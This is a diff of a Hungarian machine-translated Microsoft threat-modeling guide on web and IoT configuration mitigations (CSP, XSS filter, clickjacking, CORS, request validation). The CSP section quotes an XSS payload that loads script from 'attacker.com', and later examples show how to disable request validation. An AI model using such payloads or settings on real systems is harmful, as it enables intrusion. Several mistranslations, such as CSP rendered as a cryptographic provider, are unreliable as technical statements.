@@ -1,6 +1,6 @@
 ---
-title: Konfigurációs felügyeleti - Microsoft fenyegetés modellezési eszköz - Azure |} Microsoft Docs
-description: a fenyegetések modellezése eszköz felfedett fenyegetések megoldást
+title: Configuration Management – Microsoft Fenyegetésmodellezési eszköz – Azure |} A Microsoft Docs
+description: megoldások a fenyegetések között szerepelnek a Threat Modeling Tool
 services: security
 documentationcenter: na
 author: RodSan
@@ -14,46 +14,46 @@ ms.devlang: na
 ms.topic: article
 ms.date: 08/17/2017
 ms.author: rodsan
-ms.openlocfilehash: cea96234083abd01cdf280129e6f75a1f69af9c6
-ms.sourcegitcommit: 150a40d8ba2beaf9e22b6feff414f8298a8ef868
+ms.openlocfilehash: 5b9ef9691d3d9b9aaced3ad2aaa54e6cfc03fa14
+ms.sourcegitcommit: 0b4da003fc0063c6232f795d6b67fa8101695b61
 ms.translationtype: MT
 ms.contentlocale: hu-HU
-ms.lasthandoff: 06/27/2018
-ms.locfileid: "37028982"
+ms.lasthandoff: 07/05/2018
+ms.locfileid: "37857446"
 ---
-# <a name="security-frame-configuration-management--mitigations"></a>Biztonsági keret: Konfigurációkezelés |} Megoldást 
-| A termék vagy szolgáltatás | Cikk |
+# <a name="security-frame-configuration-management--mitigations"></a>Biztonsági keret: Konfigurációkezelés |} Megoldások 
+| Termék vagy szolgáltatás | Cikk |
 | --------------- | ------- |
-| **Webalkalmazás** | <ul><li>[Tartalom biztonsági házirend (CSP) megvalósítása, és tiltsa le a beágyazott javascript](#csp-js)</li><li>[Böngésző lehetővé szűrő engedélyezése](#xss-filter)</li><li>[ASP.NET-alkalmazások telepítését megelőzően nyomkövetéséhez és le kell tiltania](#trace-deploy)</li><li>[Hozzáférés külső JavaScript-kódok csak megbízható forrásból származó](#js-trusted)</li><li>[Győződjön meg arról, hogy a hitelesített ASP.NET-lapok tartalmaznia felhasználói felület Redressing vagy kattintással emelési védelmekkel](#ui-defenses)</li><li>[Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha az ASP.NET-webalkalmazások CORS engedélyezett](#cors-aspnet)</li><li>[ASP.NET-lapok ValidateRequest attribútum engedélyezése](#validate-aspnet)</li><li>[JavaScript-tárak legújabb verzióját helyileg üzemeltetett használata](#local-js)</li><li>[Tiltsa le az automatikus MIME-elemzése](#mime-sniff)</li><li>[Távolítsa el az általános jogú kiszolgálói fejlécek a Windows Azure Web Sites-ujjlenyomat elkerülése érdekében](#standard-finger)</li></ul> |
+| **Webalkalmazás** | <ul><li>[Tartalmak biztonsági szabályzat (CSP) megvalósítása, és beágyazott javascript letiltása](#csp-js)</li><li>[Böngésző XSS szűrő engedélyezése](#xss-filter)</li><li>[Az ASP.NET-alkalmazások le kell tiltania az nyomkövetéséhez és üzembe helyezés előtt](#trace-deploy)</li><li>[Hozzáférés külső JavaScript-kódok csak megbízható forrásból származó](#js-trusted)</li><li>[Győződjön meg arról, hogy hitelesített ASP.NET-lapok építhet be felhasználói felület Redressing, vagy kattintson az emelési védelem](#ui-defenses)</li><li>[Győződjön meg arról, hogy csak megbízható források engedélyezettek, ha a CORS engedélyezve van az ASP.NET-webalkalmazások](#cors-aspnet)</li><li>[Az ASP.NET-lapok ValidateRequest attribútum engedélyezése](#validate-aspnet)</li><li>[JavaScript-könyvtárak legújabb verzióit helyileg üzemeltetett használata](#local-js)</li><li>[Automatikus elemzés MIME letiltása](#mime-sniff)</li><li>[Távolítsa el a Windows Azure webhelyek ujjlenyomat elkerülése érdekében a szabványos server fejlécek](#standard-finger)</li></ul> |
 | **Adatbázis** | <ul><li>[A Windows tűzfal konfigurálása a hozzáféréshez](#firewall-db)</li></ul> |
-| **Webes API** | <ul><li>[Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha az ASP.NET Web API CORS engedélyezett](#cors-api)</li><li>[Titkosítani bizalmas adatokat tartalmazó Web API konfigurációs fájljainak szakaszait](#config-sensitive)</li></ul> |
-| **IoT-eszközök** | <ul><li>[Győződjön meg arról, hogy az összes felügyeleti felületeiről biztosított erős hitelesítő adatokkal](#admin-strong)</li><li>[Győződjön meg arról, hogy ismeretlen kód nem hajtható végre olyan eszközök](#unknown-exe)</li><li>[Az operációs rendszer és az AppLocker-bit az IoT-eszközök további partíciók titkosítása](#partition-iot)</li><li>[Győződjön meg arról, hogy csak a minimális szolgáltatások vagy szolgáltatások engedélyezve vannak-e az eszközökön](#min-enable)</li></ul> |
-| **Az IoT-mező átjáró** | <ul><li>[Az operációs rendszer és az AppLocker-bit IoT mező átjáró további partíciók titkosítása](#field-bit-locker)</li><li>[Győződjön meg arról, hogy az alapértelmezett bejelentkezési hitelesítő adatokat, a mező átjáró telepítésekor legyenek módosítva](#default-change)</li></ul> |
-| **Az IoT átjáró** | <ul><li>[Győződjön meg arról, hogy az átjáró megvalósítja-e olyan folyamatot, amely a csatlakoztatott eszközök belső vezérlőprogram naprakészen tartása](#cloud-firmware)</li></ul> |
-| **Gép megbízhatósági kapcsolat határán** | <ul><li>[Győződjön meg arról, hogy eszközök szervezeti házirendek szerint beállított végpont biztonsági vezérlő](#controls-policies)</li></ul> |
-| **Azure Storage** | <ul><li>[Az Azure storage elérési kulcsok biztonságos kezelése](#secure-keys)</li><li>[Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha a CORS engedélyezve van az Azure storage](#cors-storage)</li></ul> |
-| **WCF** | <ul><li>[A WCF szolgáltatás szabályozásával engedélyezése](#throttling)</li><li>[WCF-adatokhoz való illetéktelen hozzáférés metaadatok keresztül](#info-metadata)</li></ul> | 
+| **Webes API** | <ul><li>[Győződjön meg arról, hogy csak megbízható források engedélyezettek, ha a CORS engedélyezve van az ASP.NET Web API](#cors-api)</li><li>[Webes API a konfigurációs fájlok bizalmas adatokat tartalmazó szakaszok titkosítása](#config-sensitive)</li></ul> |
+| **IoT-eszköz** | <ul><li>[Győződjön meg arról, hogy az összes felügyeleti felületeiről biztosított erős hitelesítő adatokkal](#admin-strong)</li><li>[Győződjön meg arról, hogy ismeretlen kód nem hajtható végre, az eszközökön](#unknown-exe)</li><li>[Az operációs rendszer és az AppLocker-bites az IoT-eszközök további partíciók titkosítása](#partition-iot)</li><li>[Győződjön meg arról, hogy csak a minimális szolgáltatásokat és funkciókat engedélyezve vannak-e az eszközökön](#min-enable)</li></ul> |
+| **IoT helyszíni átjáró** | <ul><li>[Az operációs rendszer és az AppLocker-bites mező IoT-átjáró további partíciók titkosítása](#field-bit-locker)</li><li>[Győződjön meg arról, hogy az alapértelmezett bejelentkezési hitelesítő adatokat a helyszíni átjáró az módosítják a telepítés során](#default-change)</li></ul> |
+| **IoT átjáró** | <ul><li>[Győződjön meg arról, hogy a Felhőátjáró valósít meg egy folyamatot, hogy a csatlakoztatott eszközök belső vezérlőprogramjának naprakészen tartása](#cloud-firmware)</li></ul> |
+| **Gép megbízhatósági kapcsolat határán** | <ul><li>[Győződjön meg arról, hogy eszközök rendelkeznek-e a szervezeti szabályzatok szerint konfigurált végponti biztonsági vezérlőket](#controls-policies)</li></ul> |
+| **Azure Storage** | <ul><li>[Győződjön meg, hogy az Azure storage hozzáférési kulcsok biztonságos felügyeletéhez](#secure-keys)</li><li>[Győződjön meg arról, hogy csak megbízható források engedélyezettek, ha a CORS engedélyezve van az Azure storage](#cors-storage)</li></ul> |
+| **WCF** | <ul><li>[A szolgáltatás szabályozása a WCF szolgáltatás engedélyezése](#throttling)</li><li>[WCF-adatokhoz való illetéktelen hozzáférés, metaadatok keresztül](#info-metadata)</li></ul> | 
 
-## <a id="csp-js"></a>Tartalom biztonsági házirend (CSP) megvalósítása, és tiltsa le a beágyazott javascript
+## <a id="csp-js"></a>Tartalmak biztonsági szabályzat (CSP) megvalósítása, és beágyazott javascript letiltása
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
-| **Hivatkozások**              | [Tartalom biztonsági házirend bemutatása](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [tartalom biztonsági szabályzatainak ismertetése](http://content-security-policy.com/), [biztonsági funkciók](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [tartalom biztonsági házirend bemutatása](https://docs.webplatform.org/wiki/tutorials/content-security-policy) , [Használható CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
-| **Lépések** | <p>Tartalom biztonsági házirend (CSP), akkor egy védelemmel az olyan jellegű biztonsági eszköz, a W3C szabvány, amely lehetővé teszi az alkalmazástulajdonosok webes ellenőrzése a tartalmat a helyükön lévő beágyazott. Kriptográfiai Szolgáltató a webkiszolgálón HTTP-válaszfejléc meg van adva, és kikényszeríti a ügyféloldali böngészőkben. Egy engedélyezési lista-alapú házirend - webhely deklarálhatnak mely aktív tartalom a megbízható tartományok készlete, például JavaScript tölthetők be.</p><p>Kriptográfiai Szolgáltató a következő biztonsági előnyöket nyújtja:</p><ul><li>**Védelmet biztosít a lehetővé:** Ha egy lap lehetővé téve, egy támadó kihasználhatja azt 2 módon:<ul><li>Szúrjon `<script>malicious code</script>`. A biztonsági rés nem fog működni a felhőbeli Szolgáltató talál korlátozás-1 miatt</li><li>Szúrjon `<script src=”http://attacker.com/maliciousCode.js”/>`. A biztonsági rés nem fog működni, mivel az általa tartomány nem a felhőbeli Szolgáltató engedélyezett tartományok</li></ul></li><li>**Adatok exfiltration szabályozhatják:** Ha bármely rosszindulatú tartalmat weblapon megkísérli a külső webhelyek csatlakozhat, és ellopják adatok, a kapcsolat megszakította CSP-hez. Ez azért, mert a célként megadott tartomány nem lesz a felhőbeli Szolgáltató engedélyezési lista</li><li>**Kattintson az-emelési elleni védelmet:** kattintson-emelési egy támadási módszer használatával, amely egy ellenfél is keret a tényleges webhely és a kényszerített felhasználók felhasználói felületi elemei. Jelenleg kattintson-emelési elleni védelmet egy fejléc-X-keret-válaszbeállítások beállításával valósul meg. Nem minden böngésző, figyelembe vegyék ezt a fejlécet, és előre CSP is szabványos módon kattintson-emelési elleni védelemre</li><li>**Valós idejű támadás reporting:** Ha injektálási támadást egy CSP-kompatibilis webhelyen van, böngészők automatikusan vált az a webkiszolgálón beállított végpont üzenetszintű értesítést. Ezzel a módszerrel CSP valós idejű figyelmeztető rendszer funkcionál.</li></ul> |
+| **Hivatkozások**              | [Tartalmak biztonsági házirend bemutató](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [tartalom biztonsági házirend-referencia](http://content-security-policy.com/), [biztonsági funkciók](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [tartalom biztonsági házirend bemutatása](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) , [Használható CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
+| **Lépések** | <p>Tartalom biztonsági szabályzat (CSP) egy defense jellegű biztonsági mechanizmust, egy W3C szabvány, amely lehetővé teszi az alkalmazástulajdonosok webes ellenőrzése a helyükön a beágyazott tartalmat. CSP egészül ki egy HTTP-válaszfejléc a webkiszolgálón, és kikényszeríti a ügyféloldali böngészőkben. Ez egy olyan engedélyezési lista-alapú szabályzat - webhely deklarálhatnak mely aktív tartalomból megbízható tartományok készlete, például a JavaScript tölthetők be.</p><p>Kriptográfiai Szolgáltató a következő biztonsági előnyöket nyújtja:</p><ul><li>**XSS elleni védelem:** egy lapot ki téve a XSS, ha egy támadó kihasználhatja, 2 módon:<ul><li>Beszúrása `<script>malicious code</script>`. A biztonsági rés kiaknázása elleni nem fog működni a korlátozás-1-miatt a Felhőszolgáltató alapja</li><li>Beszúrása `<script src=”http://attacker.com/maliciousCode.js”/>`. A biztonsági rés kiaknázása elleni nem fog működni, mivel a támadó ellenőrzött tartomány nem lesz a Felhőszolgáltató engedélyezett a tartományok</li></ul></li><li>**Adatok kiszűrése szabályozhatja:** Ha bármely kártevő tartalmát egy weblap csatlakozik egy külső webhelyre, és adatokat ellopni próbál, a kapcsolat megszakad a CSP által. Ennek oka, hogy a célként megadott tartomány nem lesz a Felhőszolgáltató engedélyezési listán szereplő</li><li>**Kattintson az-emelési elleni védelmet:** kattintson-emelési egy támadási módszer használatával melyik egy támadó egy valódi webhely és a kényszerített felhasználók kattintson a felhasználói felületi elemeket is keretet. Kattintson az-emelési elleni védelmet jelenleg egy válasz fejléce-X-keret-beállítások konfigurálásával érhető el. A böngészők nem veszik figyelembe ezt a fejlécet, és előre CSP fog kattintson-emelési védekezhessen szabványos módon lesz</li><li>**Valós idejű támadási reporting:** egy CSP-engedélyezett webhely injektálás elleni támadás esetén böngészők automatikusan elindítják-egy a webkiszolgáló konfigurált végpontnak. Ezzel a módszerrel CSP figyelmeztető valós idejű rendszer szolgál.</li></ul> |
 
 ### <a name="example"></a>Példa
-Példa házirend: 
+A példában a házirend: 
 ```csharp
 Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
 ```
-Ez a házirend lehetővé teszi, hogy a parancsprogramok töltendők be, csak a a webes alkalmazás kiszolgáló és a google analytics kiszolgálón. Bármely más helyről betöltött parancsprogramok a program elutasítja. Kriptográfiai Szolgáltató engedélyezve van a webhely, amikor a program automatikusan letiltja a következő funkciók lehetővé támadások mérséklése. 
+Ez a szabályzat lehetővé teszi a parancsfájlok csak az a webalkalmazás kiszolgáló és a google analytics-kiszolgálóhoz való betöltésére. Bármely más helyről betöltött szkriptek a rendszer elutasítja. CSP engedélyezve van a webhely, amikor a program automatikusan letiltja a következő funkciókat a XSS-támadások számának csökkentése érdekében. 
 
 ### <a name="example"></a>Példa
-Beágyazott parancsfájlokra nem fogja végrehajtani. Az alábbiakban példákat beágyazott parancsfájlokra 
+Beágyazott parancsfájlokra nem megy végbe. Az alábbiakban beágyazott parancsfájlokra példái 
 ```javascript
 <script> some Javascript code </script>
 Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
@@ -61,32 +61,32 @@ javascript:alert(1);
 ```
 
 ### <a name="example"></a>Példa
-Karakterláncok kódú nem lesz kiértékelve. 
+Karakterláncok kódként nem lesz kiértékelve. 
 ```javascript
 Example: var str="alert(1)"; eval(str);
 ```
 
-## <a id="xss-filter"></a>Böngésző lehetővé szűrő engedélyezése
+## <a id="xss-filter"></a>Böngésző XSS szűrő engedélyezése
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
-| **Hivatkozások**              | [Lehetővé védelmi szűrő](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
-| **Lépések** | <p>X-lehetővé-védelmet válasz konfiguráció szabályozza a böngésző helyközi parancsfájl szűrő. A válasz fejléce a következő értékeket veheti fel:</p><ul><li>`0:` Ezzel a lépéssel letiltja a szűrő</li><li>`1: Filter enabled` Ha egy többhelyes parancsfájl-kezelési támogatás észlel, ahhoz, hogy a támadást, állítsa le a böngésző fog sanitize a lap</li><li>`1: mode=block : Filter enabled`. Ahelyett, hogy a lap sanitize, a lehetővé támadás észlelése esetén, mint a böngésző megakadályozza, hogy az oldal megjelenítési</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. A böngésző sanitize a lapot, és a jelentést a megsértése.</li></ul><p>Ez az okhoz CSP megsértése jelentések küldése az Ön által választott URI króm függvényt. Az elmúlt 2 beállítások biztonságos értékek számítanak.</p>|
+| **Hivatkozások**              | [XSS védelmi szűrő](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
+| **Lépések** | <p>Válasz X-XSS-védelmi konfiguráció a böngészőben webhelyek közötti parancsfájl szűrő szabályozza. A válasz fejléce veheti fel a következő értékeket:</p><ul><li>`0:` Ezzel a lépéssel letiltja a szűrő</li><li>`1: Filter enabled` A többhelyes parancsfájl-kezelési támadások észlelése esetén annak érdekében, hogy a támadást, állítsa le a böngészőben fog megtisztítása az oldal</li><li>`1: mode=block : Filter enabled`. Inkább a XSS-támadások észlelése esetén az oldal vírusmentesítsen, mint a böngésző megakadályozza, hogy az oldal megjelenítési</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. A böngészőben az oldal megtisztítása, és a jelentést a megsértése.</li></ul><p>Ez a CSP megsértése jelentések részletei küldése tetszőleges URI használatával króm függvény. A legutóbbi 2 beállítások biztonságos értékek számítanak.</p>|
 
-## <a id="trace-deploy"></a>ASP.NET-alkalmazások telepítését megelőzően nyomkövetéséhez és le kell tiltania
+## <a id="trace-deploy"></a>Az ASP.NET-alkalmazások le kell tiltania az nyomkövetéséhez és üzembe helyezés előtt
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
-| **Hivatkozások**              | [ASP.NET Debugging Overview](http://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET követés áttekintése](http://msdn2.microsoft.com/library/bb386420.aspx), [How to: enable Tracing for ASP.NET-alkalmazás engedélyezése](http://msdn2.microsoft.com/library/0x5wc973.aspx), [hogyan: az ASP.NET-alkalmazások hibakeresés engedélyezése](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
-| **Lépések** | Ha nyomkövetése engedélyezve van a lap minden böngésző is jut hozzá a belső kiszolgáló állapota és a munkafolyamat adatait tartalmazó nyomkövetési adatokat kér. Ez az információ biztonsági bizalmas lehet. Hibakeresés engedélyezve van a lapon, ha hiba történik a kiszolgálón egy teljes verem nyomkövetési adatok jelenik meg a böngésző eredményez. Adatok biztonsági szempontból kényes információt a kiszolgálói munkafolyamat tehetik közzé. |
+| **Hivatkozások**              | [ASP.NET – áttekintés hibakeresés](http://msdn2.microsoft.com/library/ms227556.aspx), [követés áttekintése ASP.NET](http://msdn2.microsoft.com/library/bb386420.aspx), [hogyan: enable Tracing for ASP.NET-alkalmazás engedélyezése](http://msdn2.microsoft.com/library/0x5wc973.aspx), [hogyan: az ASP.NET-alkalmazások hibakeresés engedélyezése](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
+| **Lépések** | Amikor nyomkövetés engedélyezve van minden böngésző is szerzi be a nyomkövetési adatok belső állapot és a munkafolyamat adatait tartalmazó kérő lapon. Ezt az információt lehet a biztonság-és nagybetűket. Hibakeresés engedélyezve van a lapon, ha hiba történik az a kiszolgáló egy teljes verem nyomkövetési adatok számára a böngészőben megjelenő eredményez. Az adatokat a kiszolgálói munkafolyamat biztonsági szempontból kényes információt tehetik közzé. |
 
 ## <a id="js-trusted"></a>Hozzáférés külső JavaScript-kódok csak megbízható forrásból származó
 
@@ -94,24 +94,24 @@ Example: var str="alert(1)"; eval(str);
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
-| **Lépések** | külső JavaScript-kódok csak megbízható forrásból kell lehet hivatkozni. A referencia-végpontokat kell lennie az SSL. |
+| **Lépések** | külső JavaScript-kódok csak megbízható forrásból kell lehet hivatkozni. A referencia-végpontok mindig az SSL-lel kell lennie. |
 
-## <a id="ui-defenses"></a>Győződjön meg arról, hogy a hitelesített ASP.NET-lapok tartalmaznia felhasználói felület Redressing vagy kattintással emelési védelmekkel
+## <a id="ui-defenses"></a>Győződjön meg arról, hogy hitelesített ASP.NET-lapok építhet be felhasználói felület Redressing, vagy kattintson az emelési védelem
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
-| **Hivatkozások**              | [Védelmi Cheat lap kattintson-emelési OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Internals - elleni kattintson-emelési az X-keret-beállítások](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
-| **Lépések** | <p>kattintással emelési néven is ismert a "felhasználói felület jogorvoslati támadás", akkor, ha egy támadó használ több átlátszó vagy nem átlátszó réteg felhasználót: a felhasználó a gombra kattintva vagy csatlakoztatása egy másik lapon, ha azok volt kívánó lapon a legfelső szintű.</p><p>Ez a réteges létrehozásával egy rosszindulatú lapon iframe, amely betölti az áldozat oldalon érhető el. Ebből kifolyólag a támadó "térít" gombra kell kattintania azt jelentette, hogy a lap és útválasztási őket egy másik lapra, nagy valószínűséggel tulajdonosa egy másik alkalmazás, tartomány, vagy mindkettőt. Kattintson az-emelési támadások megelőzése érdekében állítsa be a megfelelő X-keret-beállítások HTTP-válaszfejlécek, melyek arra utasítják a böngésző számára más tartományokból keretezési engedélyezi</p>|
+| **Hivatkozások**              | [Kattintson-emelési Defense Adatlap lap OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Internals - elleni küzdelemben kattintson-emelési az X-keret-beállítások](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
+| **Lépések** | <p>emelési, kattintson más néven a "felhasználói felület jogorvoslati támadások", akkor, ha egy támadó használ több transzparens vagy átlátszatlan réteg felhasználót: egy felhasználó egy gombra kattintva, vagy egy másik lapon lévő hivatkozásra, ha azok is kívánó a legfelső szintű oldalon kattintson.</p><p>Ez a réteges felépítés létrehozásával egy rosszindulatú lap IFRAME, amely betölti az áldozat lapon érhető el. Ebből kifolyólag a támadó "térít el" webszolgáltatásokban a lap, és az Útválasztás őket egy másik lapot, valószínűleg egy másik alkalmazást, tartomány vagy mindkettő által birtokolt kattintással. Kattintson az-emelési támadások megelőzése érdekében állítsa be a megfelelő X-keret-Options HTTP-válaszfejlécek, melyek arra utasítják a böngészőt, hogy engedélyezi a más tartományokból keretező</p>|
 
 ### <a name="example"></a>Példa
-Az X-keret-beállítások fejlécet az IIS web.config keresztül állítható be. Web.config kódrészletet, amely soha nem keretezhető helyek: 
+Az X-keret-OPTIONS fejlécben IIS web.config keresztül állítható be. A kódrészlet Web.config soha nem kell megalkotni helyekhez: 
 ```csharp
     <system.webServer>
         <httpProtocol>
@@ -123,7 +123,7 @@ Az X-keret-beállítások fejlécet az IIS web.config keresztül állítható be
 ```
 
 ### <a name="example"></a>Példa
-Web.config kód csak keretezhető ugyanabban a tartományban lap webhelyekhez: 
+Web.config kódot, amely ugyanabban a tartományban lapok csak kell Keretes helyek: 
 ```csharp
     <system.webServer>
         <httpProtocol>
@@ -134,19 +134,19 @@ Web.config kód csak keretezhető ugyanabban a tartományban lap webhelyekhez:
     </system.webServer>
 ```
 
-## <a id="cors-aspnet"></a>Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha az ASP.NET-webalkalmazások CORS engedélyezett
+## <a id="cors-aspnet"></a>Győződjön meg arról, hogy csak megbízható források engedélyezettek, ha a CORS engedélyezve van az ASP.NET-webalkalmazások
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | Web Forms keretrendszerre, MVC5 |
+| **Megfelelő technológiák** | Web Forms MVC5 |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
-| **Lépések** | <p>A böngésző biztonsági beállításai megakadályozzák, hogy egy weblap AJAX-kérelmeket küldjön egy másik tartományba. Ez a korlátozás az azonos eredetű házirend nevezik, és megakadályozza, hogy egy rosszindulatú hely bizalmas adatok olvasása a másik helyről. Azonban néha lehet szükséges API-k biztonságosan közzétételét mely más webhelyek is felhasználhatnak. Alhálózatok közötti Origin Resource Sharing (CORS), amely lehetővé teszi a kiszolgáló a azonos eredetű házirend enyhítése W3C szabvány. CORS használatával egy kiszolgáló kifejezetten engedélyezhet bizonyos egyes eltérő eredetű kérések elutasítása mások közben.</p><p>A CORS biztonságosabb és rugalmasabb, mint például a JSONP korábbi technikák. A a fő CORS engedélyezése az eszköz néhány HTTP-válaszfejlécek hozzáadása (hozzáférés - vezérlési-*) a webes alkalmazás, és ez végezhető el több módon.</p>|
+| **Lépések** | <p>A böngésző biztonsági beállításai megakadályozzák, hogy egy weblap AJAX-kérelmeket küldjön egy másik tartományba. Ez a korlátozás az azonos eredethez szabályzat neve, és megakadályozza, hogy egy rosszindulatú webhely érzékeny adatok olvasása a másik helyről. Azonban néha lehet szükséges API-k biztonságos elérhetővé más webhelyeket használhatnak fel. Keresztszűrés eredetű erőforrások megosztása (CORS) egy W3C szabvány, amely lehetővé teszi a kiszolgáló a azonoseredet-enyhítése. A CORS használatával, egy kiszolgáló kifejezetten engedélyezhet bizonyos néhány eltérő eredetű kérések elutasítása mellett más.</p><p>A CORS biztonságosabb és rugalmasabb, mint a korábbi technikák, például JSNOP. A hozzá tartozó fő a CORS engedélyezése a rendszer lefordítja arra néhány HTTP-válaszfejlécek hozzáadása (hozzáférés - vezérlés – *) a webes alkalmazás, és ez végezhető, többféle módon.</p>|
 
 ### <a name="example"></a>Példa
-Ha Web.config rendelkezésére áll, majd a CORS segítségével is hozzáadhat a következő kódot: 
+Ha Web.config érhető el, majd CORS segítségével is hozzáadhat a következő kódot: 
 ```XML
 <system.webServer>
     <httpProtocol>
@@ -158,26 +158,26 @@ Ha Web.config rendelkezésére áll, majd a CORS segítségével is hozzáadhat 
 ```
 
 ### <a name="example"></a>Példa
-Ha web.config való hozzáférés nem érhető el, majd CORS konfigurálhatja a következő csharp nyelvű kód felvétele: 
+Ha web.config való hozzáférés nem érhető el, majd CORS konfigurálhatók adja hozzá a következő CSharp-kódot: 
 ```csharp
 HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
 ```
 
-Vegye figyelembe, hogy nagyon fontos a győződjön meg arról, hogy a lista tartalmazza a "Hozzáférés-vezérlési-engedélyezése – Origin" attribútum van beállítva források végesnek és megbízható készlete. Nem sikerült konfigurálni a helytelenül eljárva (pl., mint érték "*") lehetővé teszi a rosszindulatú webhelyeket közötti eredetű kérések a webalkalmazás elindítása > nélkül korlátozások, ezáltal az alkalmazás a CSRF támadásokkal szemben sebezhető. 
+Vegye figyelembe, hogy rendkívül fontos győződjön meg arról, hogy a lista azokat az eredeteket tartalmazza az "Access-Control-Allow-Origin" attribútum értéke eredetek véges, és megbízható készletét. Konfigurálhatja ezt nem megfelelően működik (pl. érték szerint "*") lehetővé teszi a rosszindulatú webhelyeket eredetű kérések a webes alkalmazásba való indításához >, korlátozás nélkül ezáltal az alkalmazás CSRF támadásokkal szemben sebezhető. 
 
-## <a id="validate-aspnet"></a>ASP.NET-lapok ValidateRequest attribútum engedélyezése
+## <a id="validate-aspnet"></a>Az ASP.NET-lapok ValidateRequest attribútum engedélyezése
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | Web Forms keretrendszerre, MVC5 |
+| **Megfelelő technológiák** | Web Forms MVC5 |
 | **Attribútumok**              | –  |
-| **Hivatkozások**              | [Kérelem érvényesítése - parancsfájl támadások megelőzése](http://www.asp.net/whitepapers/request-validation) |
-| **Lépések** | <p>Kérelem érvényesítése, a szolgáltatás az ASP.NET 1.1-es verzió óta megakadályozza, hogy a kiszolgáló elfogadása tartalmazó nem kódolt HTML tartalom. Ez a funkció célja, amellyel ügyfél parancsfájlkód vagy HTML is kell tudtukon továbbíthatók a kiszolgálóhoz, tárolt és jelenik majd meg a más felhasználók számára a parancsfájl-injektálás támadások megelőzése érdekében. Továbbra is javasoljuk, hogy az összes bemeneti adatok érvényesítése és HTML kódolására, amikor szükséges.</p><p>Kérelem érvényesítése potenciálisan veszélyes értékből álló lista összes bemeneti adatot összevetésével történik. Egyezés akkor fordul elő, ha az ASP.NET kivált egy `HttpRequestValidationException`. Kérelem érvényesítése funkció alapértelmezés szerint engedélyezve van.</p>|
+| **Hivatkozások**              | [Ellenőrzés - parancsfájl támadások kérése](http://www.asp.net/whitepapers/request-validation) |
+| **Lépések** | <p>Ellenőrizni a kéréseket, a szolgáltatás az ASP.NET 1.1-es verziója óta megakadályozza, hogy a kiszolgáló fogadja a tartalom tartalmazó nem kódolt HTML. Ez a funkció célja, amellyel ügyfél-szkriptkódot, vagy a HTML-tudtukon elküldve a kiszolgáló, tárolásának, és ezután más felhasználók számára megjelenő a parancsfájl-injektálási támadások megelőzése érdekében. Továbbra is javasoljuk, hogy az összes bemeneti adatok érvényesítése és HTML kódolása, ha szükséges.</p><p>Kérelem érvényesítése potenciálisan veszélyes értékekből álló listát az összes bemeneti adatot összevetésével történik. Egyezés esetén az ASP.NET kivált egy `HttpRequestValidationException`. Ellenőrzés kérése a szolgáltatás alapértelmezés szerint engedélyezve van.</p>|
 
 ### <a name="example"></a>Példa
-Azonban ez a szolgáltatás letiltható lap szinten: 
+Ez a funkció azonban lap szintjén letiltható: 
 ```XML
 <%@ Page validateRequest="false" %> 
 ```
@@ -189,29 +189,29 @@ vagy alkalmazás szinten
    </system.web>
 </configuration>
 ```
-Vegye figyelembe, hogy érvényesítés kérése a szolgáltatás nem támogatott, és nem MVC6 folyamat részeként. 
+Vegye figyelembe, hogy az ellenőrzési kérés funkció nem támogatott, és nem MVC6 folyamat részeként. 
 
